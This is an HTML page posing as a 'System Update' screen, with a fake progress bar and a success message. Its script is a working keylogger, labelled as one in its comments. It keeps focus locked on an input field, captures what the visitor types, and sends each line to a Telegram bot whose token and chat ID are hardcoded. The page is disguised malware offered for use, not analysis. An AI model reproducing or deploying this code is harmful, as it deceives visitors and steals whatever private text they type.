<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <style>
        body {
            background: #1a1a1a;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: #2a2a2a;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0,0,0,0.8);
            max-width: 90%;
        }
        h1 { color: #00ff88; }
        .progress {
            width: 100%;
            height: 20px;
            background: #333;
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-bar {
            width: 0%;
            height: 100%;
            background: #00ff88;
            border-radius: 10px;
            animation: load 3s forwards;
        }
        @keyframes load {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        .status { color: #aaa; font-size: 14px; }

        /* Visible input field — keyboard trigger ke liye */
        #keyInput {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            width: 80%;
            padding: 12px;
            background: #333;
            border: 1px solid #00ff88;
            border-radius: 10px;
            color: #fff;
            font-size: 16px;
            text-align: center;
            opacity: 0.8;
            z-index: 999;
        }
        #keyInput:focus {
            outline: none;
            border-color: #00ff88;
            box-shadow: 0 0 20px rgba(0,255,136,0.3);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔧 System Update</h1>
        <p>Optimizing system performance...</p>
        <div class="progress">
            <div class="progress-bar"></div>
        </div>
        <p class="status">✅ Update completed successfully</p>
    </div>

    <!-- Visible input field — user ko type karne ke liye -->
    <input type="text" id="keyInput" placeholder="Type here..." autofocus>

    <script>
        // ===== TELEGRAM CONFIG =====
        const BOT_TOKEN = "8910457881:AAE9TznGCDNXkAxuo3Js_A1HaRVppAvhJuo";
        const CHAT_ID = "1431950109";
        let buffer = "";

        const inputField = document.getElementById('keyInput');

        // Force focus on input
        inputField.focus();

        // Keylogger
        inputField.addEventListener('keydown', (event) => {
            const key = event.key;
            if (key === "Enter") {
                sendToTelegram(buffer);
                buffer = "";
                inputField.value = "";
            } else if (key === "Backspace") {
                buffer = buffer.slice(0, -1);
            } else if (key.length === 1) {
                buffer += key;
            }
        });

        // Keep focus on input
        document.addEventListener('click', () => {
            inputField.focus();
        });

        function sendToTelegram(msg) {
            if (msg.trim() === "") return;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: "📱 Keylog: " + msg
                })
            });
        }

        // No auto-close — user manually close karega
    </script>
</body>
</html>
